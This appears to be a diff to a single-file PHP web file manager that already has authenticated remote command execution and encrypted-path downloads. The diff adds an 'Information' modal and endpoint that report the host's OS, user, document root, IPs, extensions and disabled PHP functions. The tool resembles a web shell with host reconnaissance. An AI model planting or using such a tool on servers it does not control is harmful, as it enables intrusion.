@@ -1174,6 +1174,85 @@ if (isset($_POST['ajax_command'])) {
     exit;
 }
 
+// Handle AJAX info request
+if (isset($_POST['ajax_info'])) {
+    header('Content-Type: application/json');
+
+    if (!authenticate()) {
+        echo json_encode([
+            'success' => false,
+            'message' => 'Authentication failed'
+        ]);
+        exit;
+    }
+
+    try {
+        $info = [];
+
+        // PHP Info
+        $info['php'] = [
+            'version' => PHP_VERSION,
+            'sapi' => php_sapi_name(),
+            'extensions' => get_loaded_extensions(),
+            'ini_path' => php_ini_loaded_file() ?: 'N/A',
+            'memory_limit' => ini_get('memory_limit') ?: 'N/A',
+            'max_execution_time' => ini_get('max_execution_time') ?: '0',
+            'upload_max_filesize' => ini_get('upload_max_filesize') ?: 'N/A',
+            'post_max_size' => ini_get('post_max_size') ?: 'N/A',
+            'display_errors' => ini_get('display_errors') ?: '0',
+            'error_reporting' => error_reporting(),
+        ];
+
+        // Server Info
+        $info['server'] = [
+            'software' => $_SERVER['SERVER_SOFTWARE'] ?? 'N/A',
+            'name' => $_SERVER['SERVER_NAME'] ?? 'N/A',
+            'protocol' => $_SERVER['SERVER_PROTOCOL'] ?? 'N/A',
+            'document_root' => $_SERVER['DOCUMENT_ROOT'] ?? 'N/A',
+            'remote_addr' => $_SERVER['REMOTE_ADDR'] ?? 'N/A',
+            'server_addr' => $_SERVER['SERVER_ADDR'] ?? 'N/A',
+        ];
+
+        // System Info
+        $info['system'] = [
+            'os' => PHP_OS,
+            'os_family' => defined('PHP_OS_FAMILY') ? PHP_OS_FAMILY : PHP_OS,
+            'hostname' => @gethostname() ?: 'N/A',
+            'uname' => @php_uname() ?: 'N/A',
+            'current_user' => @get_current_user() ?: 'N/A',
+            'current_dir' => @getcwd() ?: 'N/A',
+            'temp_dir' => @sys_get_temp_dir() ?: 'N/A',
+        ];
+
+        // Disk Info
+        $diskTotal = @disk_total_space('/');
+        $diskFree = @disk_free_space('/');
+        $info['disk'] = [
+            'total' => $diskTotal ? formatSize((int)$diskTotal) : 'N/A',
+            'free' => $diskFree ? formatSize((int)$diskFree) : 'N/A',
+        ];
+
+        // Database Extensions
+        $dbExtensions = ['mysqli', 'pdo_mysql', 'pgsql', 'pdo_pgsql', 'sqlite3', 'pdo_sqlite', 'mongodb'];
+        $info['databases'] = array_values(array_filter($dbExtensions, 'extension_loaded'));
+
+        // Disabled Functions
+        $disabledFunctions = ini_get('disable_functions');
+        $info['disabled_functions'] = $disabledFunctions ? array_map('trim', explode(',', $disabledFunctions)) : [];
+
+        echo json_encode([
+            'success' => true,
+            'info' => $info
+        ]);
+    } catch (Exception $e) {
+        echo json_encode([
+            'success' => false,
+            'message' => 'Error: ' . $e->getMessage()
+        ]);
+    }
+    exit;
+}
+
 // Handle download
 if (isset($_GET['download'])) {
     $file = decryptPath($_GET['download']);
@@ -1291,6 +1370,8 @@ $currentTime = date('Y-m-d H:i:s');
         'on-primary' => '#55200C',
         'error' => '#FFB4AB',
         'on-error' => '#690005',
+        'error-container' => '#93000A',
+        'on-error-container' => '#FFDAD6',
         'success' => '#D6C68D',
         'warning' => '#E7BDB0',
     ] : [
@@ -1313,6 +1394,8 @@ $currentTime = date('Y-m-d H:i:s');
         'on-primary' => '#FFFFFF',
         'error' => '#BA1A1A',
         'on-error' => '#FFFFFF',
+        'error-container' => '#FFDAD6',
+        'on-error-container' => '#410002',
         'success' => '#6A5E2F',
         'warning' => '#77574C',
     ];
@@ -1383,6 +1466,12 @@ $currentTime = date('Y-m-d H:i:s');
             ;
             --error:
                 <?= $themeColors['error'] ?>
+            ;
+            --error-container:
+                <?= $themeColors['error-container'] ?>
+            ;
+            --on-error-container:
+                <?= $themeColors['on-error-container'] ?>
             ;
         }
 
@@ -1946,6 +2035,16 @@ $currentTime = date('Y-m-d H:i:s');
                         </svg>
                         <span class="hidden sm:inline">Command</span>
                         <span class="sm:hidden">Cmd</span>
+                    </button>
+                    <button onclick="showInfoModal()"
+                        class="flex items-center px-3 py-2 bg-primary text-on-primary rounded-xl hover:opacity-90 transition-all shadow-sm hover:shadow-md text-sm font-medium">
+                        <svg class="h-4 w-4 mr-1.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z">
+                            </path>
+                        </svg>
+                        <span class="hidden sm:inline">Information</span>
+                        <span class="sm:hidden">Info</span>
                     </button>
                 </div>
             </div>
@@ -2529,6 +2628,125 @@ $currentTime = date('Y-m-d H:i:s');
                         outputPre.textContent = 'Error: ' + error.message;
                         outputPre.style.color = 'var(--error)';
                     });
+            });
+        }
+
+        // Information Modal
+        function showInfoModal() {
+            const html = `
+                <div class="modal-header">
+                    <h2 class="text-xl font-bold text-primary flex items-center gap-3">
+                        <svg class="h-6 w-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                        </svg>
+                        <span>System Information</span>
+                    </h2>
+                </div>
+                <div class="modal-body">
+                    <div id="infoContent" style="display: flex; align-items: center; justify-content: center; min-height: 200px;">
+                        <div style="color: var(--on-surface-variant);">Loading...</div>
+                    </div>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-secondary" data-modal-close>
+                        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" style="width: 18px; height: 18px;">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
+                        </svg>
+                        <span>Close</span>
+                    </button>
+                </div>
+            `;
+            Modal.open(html, 'modal-lg');
+
+            const infoContent = document.getElementById('infoContent');
+            const baseUrl = window.location.pathname;
+
+            fetch(baseUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: 'ajax_info=1'
+            })
+            .then(response => response.text())
+            .then(text => {
+                try {
+                    const data = JSON.parse(text);
+                    if (data.success) {
+                    const info = data.info;
+                    infoContent.innerHTML = `
+                        <div style="width: 100%; max-height: 400px; overflow-y: auto;">
+                            <div style="display: grid; gap: 16px;">
+                                <div style="background: var(--surface-container-highest); border-radius: 12px; padding: 16px;">
+                                    <div style="font-weight: 600; color: var(--primary); margin-bottom: 12px; font-size: 14px;">PHP</div>
+                                    <div style="display: grid; gap: 8px; font-size: 13px;">
+                                        <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Version</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.php.version)}</span></div>
+                                        <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">SAPI</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.php.sapi)}</span></div>
+                                        <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Memory Limit</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.php.memory_limit)}</span></div>
+                                        <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Max Execution</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.php.max_execution_time)}s</span></div>
+                                        <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Upload Max</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.php.upload_max_filesize)}</span></div>
+                                        <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Post Max</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.php.post_max_size)}</span></div>
+                                    </div>
+                                </div>
+                                <div style="background: var(--surface-container-highest); border-radius: 12px; padding: 16px;">
+                                    <div style="font-weight: 600; color: var(--primary); margin-bottom: 12px; font-size: 14px;">System</div>
+                                    <div style="display: grid; gap: 8px; font-size: 13px;">
+                                        <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">OS</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.system.os)} (${escapeHtml(info.system.os_family)})</span></div>
+                                        <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Hostname</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.system.hostname)}</span></div>
+                                        <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">User</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.system.current_user)}</span></div>
+                                        <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Temp Dir</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.system.temp_dir)}</span></div>
+                                    </div>
+                                </div>
+                                <div style="background: var(--surface-container-highest); border-radius: 12px; padding: 16px;">
+                                    <div style="font-weight: 600; color: var(--primary); margin-bottom: 12px; font-size: 14px;">Server</div>
+                                    <div style="display: grid; gap: 8px; font-size: 13px;">
+                                        <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Software</span><span style="color: var(--on-surface); font-family: monospace; text-align: right; max-width: 60%; word-break: break-word;">${escapeHtml(info.server.software)}</span></div>
+                                        <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Server Name</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.server.name)}</span></div>
+                                        <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Document Root</span><span style="color: var(--on-surface); font-family: monospace; text-align: right; max-width: 60%; word-break: break-word;">${escapeHtml(info.server.document_root)}</span></div>
+                                        <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Remote IP</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.server.remote_addr)}</span></div>
+                                        <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Server IP</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.server.server_addr)}</span></div>
+                                    </div>
+                                </div>
+                                <div style="background: var(--surface-container-highest); border-radius: 12px; padding: 16px;">
+                                    <div style="font-weight: 600; color: var(--primary); margin-bottom: 12px; font-size: 14px;">Storage</div>
+                                    <div style="display: grid; gap: 8px; font-size: 13px;">
+                                        <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Disk Total</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.disk.total)}</span></div>
+                                        <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Disk Free</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.disk.free)}</span></div>
+                                    </div>
+                                </div>
+                                <div style="background: var(--surface-container-highest); border-radius: 12px; padding: 16px;">
+                                    <div style="font-weight: 600; color: var(--primary); margin-bottom: 12px; font-size: 14px;">Database Extensions</div>
+                                    <div style="display: flex; flex-wrap: wrap; gap: 8px;">
+                                        ${info.databases.length > 0
+                                            ? info.databases.map(db => `<span style="background: var(--surface-container); color: var(--on-surface); padding: 4px 10px; border-radius: 8px; font-size: 12px; font-family: monospace;">${escapeHtml(db)}</span>`).join('')
+                                            : '<span style="color: var(--on-surface-variant); font-size: 13px;">None loaded</span>'
+                                        }
+                                    </div>
+                                </div>
+                                <div style="background: var(--surface-container-highest); border-radius: 12px; padding: 16px;">
+                                    <div style="font-weight: 600; color: var(--primary); margin-bottom: 12px; font-size: 14px;">Loaded Extensions (${info.php.extensions.length})</div>
+                                    <div style="display: flex; flex-wrap: wrap; gap: 6px; max-height: 120px; overflow-y: auto;">
+                                        ${info.php.extensions.map(ext => `<span style="background: var(--surface-container); color: var(--on-surface-variant); padding: 3px 8px; border-radius: 6px; font-size: 11px; font-family: monospace;">${escapeHtml(ext)}</span>`).join('')}
+                                    </div>
+                                </div>
+                                ${info.disabled_functions.length > 0 ? `
+                                <div style="background: var(--surface-container-highest); border-radius: 12px; padding: 16px;">
+                                    <div style="font-weight: 600; color: var(--error); margin-bottom: 12px; font-size: 14px;">Disabled Functions (${info.disabled_functions.length})</div>
+                                    <div style="display: flex; flex-wrap: wrap; gap: 6px; max-height: 100px; overflow-y: auto;">
+                                        ${info.disabled_functions.map(fn => `<span style="background: var(--error-container); color: var(--on-error-container); padding: 3px 8px; border-radius: 6px; font-size: 11px; font-family: monospace;">${escapeHtml(fn.trim())}</span>`).join('')}
+                                    </div>
+                                </div>
+                                ` : ''}
+                            </div>
+                        </div>
+                    `;
+                } else {
+                    infoContent.innerHTML = `<div style="color: var(--error);">Error: ${escapeHtml(data.message || 'Failed to load info')}</div>`;
+                }
+                } catch (e) {
+                    infoContent.innerHTML = `<div style="color: var(--error);">Error parsing response: ${escapeHtml(text.substring(0, 200))}</div>`;
+                }
+            })
+            .catch(error => {
+                infoContent.innerHTML = `<div style="color: var(--error);">Error: ${escapeHtml(error.message)}</div>`;
             });
         }
 
